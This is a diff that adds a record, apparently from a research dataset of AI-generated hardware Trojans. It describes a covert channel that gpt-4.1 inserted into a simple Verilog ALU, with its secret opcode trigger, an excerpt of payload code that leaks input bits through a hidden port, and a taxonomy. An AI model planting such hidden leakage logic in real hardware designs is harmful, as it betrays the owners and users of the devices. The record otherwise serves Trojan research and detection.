@@ -1,0 +1,35 @@
+Design: alu_simple.v
+Vulnerability ID: T2
+Model: gpt-4.1
+Attempts: 1
+
+Explanation:
+A covert channel Trojan is inserted that leaks the `a` input value serially via a `covert_out` port when a secret opcode trigger is seen; the original ALU functionality is maintained.
+
+Trigger:
+The Trojan is internally triggered when the ALU receives the opcode sequence 3'b111, 3'b101, 3'b110 on consecutive clock cycles with `rst_n` deasserted.
+
+Payload:
+Serially leak `a` LSB-first via `covert_out`, one bit per clock
+            if (leak_state < 3'd8) begin
+                leak_data <= a;
+                covert_out <= a[leak_state];
+                leak_state <= leak_state + 3'd1;
+            end else begin
+                covert_out <= 1'b0;
+                trojan_active <= 1'b0;
+                leak_state <= 3'd0;
+                trigger_counter <= 4'd0;
+            end
+        end
+    end
+end
+// trojan_insertion_end //
+
+Taxonomy:
+Insertion phase: Design  
+Abstraction level: Register-transfer level  
+Activation mechanism: Triggered internally (via opcode sequence)  
+Effects: leak information  
+Location: Processor (ALU datapath and output)  
+Characteristics: Small, distributed, Functional Trojan
